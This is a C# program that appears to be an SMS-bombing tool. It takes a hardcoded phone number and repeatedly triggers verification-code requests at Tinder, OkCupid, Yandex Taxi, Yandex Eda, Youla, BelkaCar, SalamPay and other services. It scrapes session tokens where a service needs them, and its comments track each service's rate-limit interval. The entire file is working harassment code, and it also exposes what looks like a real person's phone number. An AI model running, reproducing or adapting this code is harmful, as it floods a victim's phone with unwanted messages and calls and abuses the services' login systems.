using System;
using System.Net;
using System.IO;
using System.Text;
using System.Threading;

namespace test
{
    class MainClass
    {
        public static void Main(string[] args)
        {
            string phone = "9167380863"; //without country code

            YandexTaxi yandexTaxi = new YandexTaxi(phone);
            Tinder tinder = new Tinder(phone);
            Youla youla = new Youla(phone);
            Karusel karusel = new Karusel(phone);
            Findclone findclone = new Findclone(phone);
            BelkaCar belkaCar = new BelkaCar(phone);
            YandexEda yandexEda = new YandexEda(phone);
            SalamPay salamPay = new SalamPay(phone);
            Wink wink = new Wink(phone);
            OkCupid okCupid = new OkCupid(phone);

            for (int i = 0; i < 1; ++i)
            {
                yandexTaxi.SendYaTaxiPOST();
                tinder.SendTinderPOST();
                youla.SendYoulaPOST();
                karusel.SendKaruselPOST();
                //findclone.SendFindclone();
                belkaCar.SendBelkaCarPOST();
                yandexEda.SenYaEdaPOST();
                salamPay.SendSalamPayPOST();

                okCupid.SendOkCupidPOST();
                Thread.Sleep(7000);
            }

            //for (int i = 0;)
        }

        public static void ShowAnswer(WebRequest request)
        {
            var response = (HttpWebResponse)request.GetResponse();
            using (var streamReader = new StreamReader(response.GetResponseStream()))
            {
                var result = streamReader.ReadToEnd(); Console.WriteLine(result);
            }
        }
    }



    class YandexTaxi
    { 
        public YandexTaxi(string temp)
        {
            phone = "+7" + temp;
        }

        public void GetYaTaxiCode()
        {

            HttpWebRequest request = (HttpWebRequest)WebRequest.Create("https://taxi.yandex.ru/#auth");
            HttpWebResponse response = (HttpWebResponse)request.GetResponse();
            if (response.StatusCode == HttpStatusCode.OK)
            {
                Stream receiveStream = response.GetResponseStream();
                StreamReader readStream = null;
                if (response.CharacterSet == null)
                {
                    readStream = new StreamReader(receiveStream);
                }
                else
                {
                    readStream = new StreamReader(receiveStream, Encoding.GetEncoding(response.CharacterSet));
                }
                id = readStream.ReadToEnd();
                string searchID = "],\"id\"";
                int searchResult = id.IndexOf(searchID);
                id = id.Substring(searchResult + searchID.Length, 32);
                response.Close();
                readStream.Close();
            }
        }

        public void SendYaTaxiPOST()
        {
            GetYaTaxiCode();

            HttpWebRequest request = (HttpWebRequest)WebRequest.Create("https://taxi.yandex.ru/3.0/auth");
            request.ContentType = "application/json";
            request.Method = "POST";

            using (var streamWriter = new StreamWriter(request.GetRequestStream()))
            {
                string json = "{\"id\":\"" + id + "\"," +
                              "\"phone\":\"" + phone + "\"}";

                streamWriter.Write(json);
            }

            MainClass.ShowAnswer(request);
        }

        private static string phone, id;
    }

    class Tinder
    {
        public Tinder(string temp) 
        {
            phone = "7" + temp;
        }

        public void SendTinderPOST()
        {
            HttpWebRequest request = (HttpWebRequest)WebRequest.Create("https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=en");
            request.ContentType = "application/json";
            request.Method = "POST";

            using (var streamWriter = new StreamWriter(request.GetRequestStream()))
            {
                string json = "{\"phone_number\":\"" + phone + "\"}";

                streamWriter.Write(json);
            }

            MainClass.ShowAnswer(request);
        }

        private static string phone;
    }

    class Youla
    {
        public Youla(string temp)
        {
            phone = "+7" + temp;
        }

        public void SendYoulaPOST()
        {
            HttpWebRequest request = (HttpWebRequest)WebRequest.Create("https://youla.ru/web-api/auth/request_code");
            request.ContentType = "application/json";
            request.Method = "POST";

            using (var streamWriter = new StreamWriter(request.GetRequestStream()))
            {
                string json = "{\"phone\":\"" + phone + "\"}";

                streamWriter.Write(json);
            }

            MainClass.ShowAnswer(request);
        }

        private static string phone;
    }

    class Karusel //interval 60 sec
    {
        public Karusel(string temp)
        {
            phone = "7" + temp;
        }

        public void SendKaruselPOST()
        {
            HttpWebRequest request = (HttpWebRequest)WebRequest.Create("https://app.karusel.ru/api/v1/phone/");
            request.ContentType = "application/json";
            request.Method = "POST";

            using (var streamWriter = new StreamWriter(request.GetRequestStream()))
            {
                string json = "{\"phone\":\"" + phone + "\"}";

                streamWriter.Write(json);
            }

            MainClass.ShowAnswer(request);
        }

        private static string phone;
    }

    class Findclone //ring interval 180s?
    {
        public Findclone(string temp)
        {
            phone = "+7" + temp;
        }

        public void SendFindclone()
        {
            string requestString = "https://findclone.ru/register?phone=" + phone;
            HttpWebRequest request = (HttpWebRequest)WebRequest.Create(requestString);
            //request.ContentType = "application/json";
            //request.Method = "POST";

            MainClass.ShowAnswer(request);
        }

        private static string phone;
    }

    class BelkaCar //interval 60 sec
    {
        public BelkaCar(string temp)
        {
            phone = "7" + temp;
        }

        public void SendBelkaCarPOST()
        {
            HttpWebRequest request = (HttpWebRequest)WebRequest.Create("https://lk.belkacar.ru/get-confirmation-code");
            request.ContentType = "application/x-www-form-urlencoded";
            request.Method = "POST";
            request.UserAgent = "Mozilla/5.0";

            using (var streamWriter = new StreamWriter(request.GetRequestStream()))
            {
                string json = "phone=" + phone;

                streamWriter.Write(json);
            }

            MainClass.ShowAnswer(request);
        }

        private static string phone;
    }

    class YandexEda //interval 60 sec
    {
        public YandexEda(string temp)
        {
            phone = "+7" + temp;
        }

        public void SenYaEdaPOST()
        {
            HttpWebRequest request = (HttpWebRequest)WebRequest.Create("https://eda.yandex/api/v1/user/request_authentication_code");
            request.ContentType = "application/json";
            request.Method = "POST";

            using (var streamWriter = new StreamWriter(request.GetRequestStream()))
            {
                string json = "{\"phone_number\":\"" + phone + "\"}";

                streamWriter.Write(json);
            }

            MainClass.ShowAnswer(request);
        }

        private static string phone;
    }

    class SalamPay //interval 15s
    {
        public SalamPay(string temp)
        {
            phone = "7" + temp;
        }

        public void SendSalamPayPOST()
        {
            HttpWebRequest request = (HttpWebRequest)WebRequest.Create("https://app.salampay.com/api/system/sms/c549d0c2-ee78-4a98-659d-08d682a42b29");
            request.ContentType = "application/x-www-form-urlencoded";
            request.Method = "POST";

            using (var streamWriter = new StreamWriter(request.GetRequestStream()))
            {
                string json = "caller_number=" + phone;

                streamWriter.Write(json);
            }

            MainClass.ShowAnswer(request);
        }

        private static string phone;
    }

    class Wink //interval 30 sec
    {
        public Wink(string temp)
        {
            phone = "+7" + temp;
        }

        public void GetWinkSessionID()
        {
            HttpWebRequest request = (HttpWebRequest)WebRequest.Create("https://cnt-odcv-itv02.svc.iptv.rt.ru/api/v2/portal/session_tokens");
            request.ContentType = "application/json";
            request.Method = "POST";

            var response = (HttpWebResponse)request.GetResponse();
            using (var streamReader = new StreamReader(response.GetResponseStream()))
            {
                Stream receiveStream = response.GetResponseStream();
                StreamReader readStream = null;
                if (response.CharacterSet == null)
                {
                    readStream = new StreamReader(receiveStream);
                }
                else
                {
                    readStream = new StreamReader(receiveStream, Encoding.GetEncoding(response.CharacterSet));
                }
                id = readStream.ReadToEnd();
                string searchID = "session_id\":\"";
                int searchResult = id.IndexOf(searchID);
                id = id.Substring(searchResult +searchID.Length, 54);
            }
        }

        public void SendWinkPOST()
        {
            HttpWebRequest request = (HttpWebRequest)WebRequest.Create("https://cnt-odcv-itv02.svc.iptv.rt.ru/api/v2/portal/send_sms_code");
            request.ContentType = "application/json";
            request.Method = "POST";

            GetWinkSessionID();

            request.Headers.Add("session_id:" + id);

            using (var streamWriter = new StreamWriter(request.GetRequestStream()))
            {
                string json = "{\"phone\":\"" + phone + "\", \"action\":\"register\"}";

                streamWriter.Write(json);
            }

            MainClass.ShowAnswer(request);
        }

        private static string phone, id;
    }

    class OkCupid //interval 10-15s
    {
        public OkCupid(string temp)
        {
            phone = "7" + temp;
        }

        public void GetOkCupidID()
        {
            HttpWebRequest request = (HttpWebRequest)WebRequest.Create("https://www.okcupid.com/graphql");
            request.ContentType = "application/json";
            request.Method = "POST";

            using (var streamWriter = new StreamWriter(request.GetRequestStream()))
            {
                string json = "{\"operationName\":\"authTSPAccessTokenCreate\",\"variables\":{},\"query\":\"mutation authTSPAccessTokenCreate {  authTSPAccessTokenCreate {    tspAccessToken    __typename  }}\"}";

                streamWriter.Write(json);
            }

            var response = (HttpWebResponse)request.GetResponse();
            using (var streamReader = new StreamReader(response.GetResponseStream()))
            {
                Stream receiveStream = response.GetResponseStream();
                StreamReader readStream = null;
                if (response.CharacterSet == null)
                {
                    readStream = new StreamReader(receiveStream);
                }
                else
                {
                    readStream = new StreamReader(receiveStream, Encoding.GetEncoding(response.CharacterSet));
                }
                id = readStream.ReadToEnd();
                string searchID = "tspAccessToken\":\"";
                int searchResult = id.IndexOf(searchID);
                id = id.Substring(searchResult + searchID.Length, 153);
            }
        }

        public void SendOkCupidPOST()
        {
            HttpWebRequest request = (HttpWebRequest)WebRequest.Create("https://www.okcupid.com/graphql");
            request.ContentType = "application/json";
            request.Method = "POST";

            GetOkCupidID();

            using (var streamWriter = new StreamWriter(request.GetRequestStream()))
            {
                string json = "{\"operationName\":\"authOTPSend\",\"variables\":{\"input\":{\"tspAccessToken\":\"" + id + "\",\"phoneNumber\":\"" + phone + "\",\"platform\":\"web\"} },\"query\":\"mutation authOTPSend($input: AuthOTPSendInput!) {  authOTPSend(input: $input) {   success    __typename  }}\"}";
                streamWriter.Write(json);
            }

            MainClass.ShowAnswer(request);
        }

        private static string phone, id;
    }
}
